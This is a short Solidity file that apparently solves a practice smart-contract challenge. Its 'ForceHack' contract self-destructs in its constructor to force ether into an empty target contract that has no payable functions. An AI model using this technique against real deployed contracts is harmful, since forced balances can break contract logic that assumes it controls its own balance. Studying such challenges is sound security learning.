pragma solidity ^0.8;

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// when deploying ForceHack - send 1 wei to have balance

contract Force {
    /*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/
}

contract ForceHack {
    constructor(address payable _target) payable {
        // on selfdestruct balance will be send to target
        selfdestruct(_target);
    }
}

